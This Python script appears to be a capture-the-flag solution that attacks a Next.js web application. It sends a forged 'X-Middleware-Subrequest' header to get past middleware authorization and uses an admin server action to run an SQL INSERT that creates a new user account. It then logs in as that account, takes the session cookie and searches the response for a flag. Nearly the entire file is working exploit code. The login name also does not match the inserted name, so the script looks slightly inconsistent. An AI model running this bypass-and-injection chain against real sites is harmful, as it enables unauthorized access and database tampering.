import requests
import sys
import re

HOST=sys.argv[1]
USERNAME='Test221'
NextAction=['40c042888b693364dee86c0dee6d8500ffd65f10c0', '40c042888b693364dee86c0dee6d8500ffd65f10c0', '40c042888b693364dee86c0dee6d8500ffd65f10c0']


headers = {
    'X-Middleware-Subrequest': 'middleware:middleware:middleware:middleware:middleware',
    'Content-Type':'text/plain;charset=UTF-8',
    "Next-Action": NextAction[0],  
    "Next-Router-State-Tree": '%5B%22%22%2C%7B%22children%22%3A%5B%22admin%22%2C%7B%22children%22%3A%5B%22dump%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Fadmin%2Fdump%22%2C%22refresh%22%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
    "Accept": "text/x-component",
    "Content-Type": "text/plain;charset=UTF-8",
    #"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
}

payload = [
    '''INSERT INTO "Robot" (name, "modelId", password)
    VALUES ('inje1231312cted', 3, '$2a$10$/HSu52ZCs1A/H1TyYXOKWu8A6ufl8AsnqMfXW7Yt6nQ8FHT05UOFu');'''
]

session = requests.Session()

res = session.post(HOST+"/admin/dump", headers=headers, json=payload)
print("[+] Injection status:", res.status_code)

login_url = HOST+"/robot/login"

login_headers = {
    "Next-Action": NextAction[1], 
    "Next-Router-State-Tree": '%5B%22%22%2C%7B%22children%22%3A%5B%22robot%22%2C%7B%22children%22%3A%5B%22login%22%2C%7B%22children%22%3A%5B%22__PAGE__%22%2C%7B%7D%2C%22%2Frobot%2Flogin%22%2C%22refresh%22%5D%7D%5D%7D%5D%7D%2Cnull%2Cnull%2Ctrue%5D',
    "Accept": "text/x-component",
    "Content-Type": "text/plain;charset=UTF-8",
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
}

login_data = [
    {
        "name": "injected",
        "password": "1234"
    }
]

r = requests.post(login_url, headers=login_headers, json=login_data)

print("[+] Login status:", r.status_code)
cookie = r.headers.get("set-cookie")
if not cookie:
    print("[-] Login failed or no cookie returned.")
    exit(1)
print("[+] Got Cookie:", cookie.split(';')[0])

final_url = HOST+"/robot"
final_headers = {
    "Next-Action": NextAction[2],
    "Content-Type": "text/plain;charset=UTF-8",
    "Cookie": cookie,
     "User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36"
}

r3 = requests.post(final_url, headers=final_headers, data="[]")
print("[+] Final status:", r3.status_code)


flag_match = re.search(r'vka\{[a-zA-Z0-9_]*\}', r3.text)
if flag_match:
    print("[✅] Flag found:", flag_match.group(0))
else:
    print("[-] Flag not found.")